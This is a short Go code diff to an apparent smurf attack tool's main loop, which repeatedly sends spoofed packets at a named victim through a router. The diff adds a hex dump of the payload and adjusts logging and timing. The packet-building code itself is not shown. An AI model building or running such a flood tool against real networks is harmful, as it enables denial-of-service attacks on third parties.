@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/hex"
 	"log"
 	"net"
 	"time"
@@ -15,12 +16,13 @@ func main() {
 		log.Fatal(err)
 	}
 
+	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
 	for {
-		log.Printf("[smurf attack] victim (%s), with router (%s)", victim.String(), router.String())
-		time.Sleep(time.Second * 1)
+		log.Printf("[smurf] victim (%s), with router (%s)", victim.String(), router.String())
 		if err := s.send(); err != nil {
-			log.Printf("[smurf attack] error: %s", err)
+			log.Printf("[smurf] error: %s", err)
 		}
+		time.Sleep(time.Second * 1)
 	}
 
 }
